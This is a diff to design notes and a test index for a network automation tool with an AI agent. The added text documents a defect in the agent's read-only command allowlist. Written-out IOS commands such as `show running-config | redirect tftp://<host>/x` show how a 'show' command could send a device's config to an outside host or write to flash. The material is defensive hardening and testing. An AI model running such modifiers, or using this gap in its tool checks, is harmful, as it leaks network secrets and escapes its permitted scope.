@@ -119,6 +119,11 @@ tracked in git.
 - **[modules/outbound.py](modules/outbound.py)** — config text on its way out:
   masked unless a person reveals it with `?reveal=1`, recorded. The golden
   routes and the backup download call it (C56): one pattern, not two
+- **[modules/readonly_commands.py](modules/readonly_commands.py)** — C61:
+  the ONE read-only command allowlist, whole command: verb, every output
+  modifier after a `|`, no URL, no target-less ping, no line editing. The
+  agent's tools use it; the lens, `/run_command` and `bulk_execute` adopt it
+  in 7.3
 - **[modules/invalidation.py](modules/invalidation.py)** — Stage 7.0: what
   each mutating route invalidates, in a finite vocabulary of data keys; the
   response carries it. Client: **[static/js/nmas_invalidation.js](static/js/nmas_invalidation.js)**
@@ -995,6 +1000,7 @@ from the repo root. (Before Phase 0 only the latter did.)
 | `test_no_agent_tool_leaks_a_stored_secret.py` | C56 (agent side): every agent tool driven through the REAL `run_chat()` loop and provider boundary with a fake client, every store planted; no tool result the provider would receive holds a planted value; `read_variables` reached the store and withholds; a tool made to leak in prose is found |
 | `test_netbox_write_failures_are_counted.py` | C8: against a NetBox that REFUSES chosen writes, the failures reported equal the failures injected, each naming device and write; the report's `complete` is false with no failed device and one missing write; an AST rule that every handler guarding a write records, re-raises, retries or refuses (floor 18); a refused delete is `failed` with its reason, never a skip |
 | `test_netbox_untagged.py` | C59: a create whose tag cannot be ensured is REFUSED and counted, and a tag failure is never cached; `nmas-netbox-untagged` finds recorded-but-untagged objects and unrecorded creates by NMAS's account (identified from a recorded object's own changelog entry), never lists another account's, and reads an unreadable object or changelog as UNPROVEN, not gone |
+| `test_readonly_commands.py` | C61: `show running-config \| redirect tftp://…` refused, and every spelling of a writing modifier (`redirect`, `tee`, `append`, `format`, abbreviated, unspaced, chained, hidden in a regex); an unknown modifier refused; the filters still pass (the control); a URL, a target-less ping, `?` and control characters refused; `clear` and `debug` are not reads; one verb list in the program (AST, floor); the agent delegates; the ambiguity guard shown with a constructed filter |
 | `test_reads_create_no_list.py` | C51 (7.0): EVERY GET, with an unknown list name in each place a list arrives, creates no list (24 did; floors on the sweep); the refusal is a named 404 that says it is not an empty list; a real list by name and by slug still reads |
 | `test_requirements_lock.py` | C37: every third-party import is mapped and pinned exactly in the host-generated lock; the lock names its producer; the C35 pair is not what CI installs |
 | `test_network_guard.py` | C46: the test process refuses non-loopback connects and loopback is still the kernel's answer; a child with a bare env, a DNS name, ssh/curl/rsync and a remote git are each refused and recorded; a fake the test built runs and one outside pytest's tree does not; C46's exact case cannot reach the live NMAS; an attempt fails the test that made it, observed from a nested run; the confinement measurement's three answers; what a run reports is what a CHILD process gets; a required run that is not confined stops; the runner requires what it creates and never runs as root |
@@ -4816,6 +4822,14 @@ run if the checkout's `data/` changed at all (C32). Importing `app` starts no se
   "seconds instead of 30 minutes" moves an automated revert from after the
   repair into the middle of it. Before wiring an action to an event, ask what
   else the event correlates with.
+- **A first word is not a command** (C61, 2026-09-27). The agent's read-only
+  allowlist checked the verb, and an IOS output modifier makes a `show`
+  WRITE: `| redirect tftp://<host>/x` sends the whole config to another host,
+  and the device sends it, so the tool's redaction never sees the bytes.
+  B13's shape: a secret leaving through a path the gate did not examine.
+  Both halves are allowlists now, verb and modifier. The sweep for the shape
+  found one more of the family (C63): the deploy's dangerous check is a list
+  of forms, and misses `no router rip` on a fleet running RIP.
 - Silent failure is the dominant failure mode in this stack. Every integration
   call must log and surface its failures rather than swallowing them.
 - `modules/pipeline.py` is real, tested and WIRED: every deploy and every
@@ -4961,10 +4975,14 @@ design so the tool library describes a finished system.
   - **24 tools are removed from the list AND the dispatch:** device push,
     restore and replay, commits, self-modification, self-writing knowledge
     and the CCIE base, report files, and writes to the tool's own settings.
-  - **The three `execute_*` tools run only read-only verbs**
+  - **The three `execute_*` tools run only read-only commands**
     (`_read_only_refusal`: show, ping, traceroute, dir, more). Config mode,
     every other verb and a line break are refused, checked before any
-    session opens.
+    session opens. **The check was the first word only until C61
+    (2026-09-27)**: `| redirect tftp://` let a "show" send the device's
+    config to another host, and `| redirect flash:` wrote to the device, so
+    "cannot change a device" was false in two directions. It is the whole
+    command now, in `modules/readonly_commands.py`.
   - The Jenkins tools are P.4's. The prompt still names the removed tools 77
     times (C30, Stage 8.5).
 - **The unguarded golden replay was reachable from TWO GUI buttons, not only the AI** (register D5). **Fixed by P.3 step 3**: both buttons open the guarded restore preview at HEAD, and the two routes are gone. The AI's tool of the same name was removed by step 8.
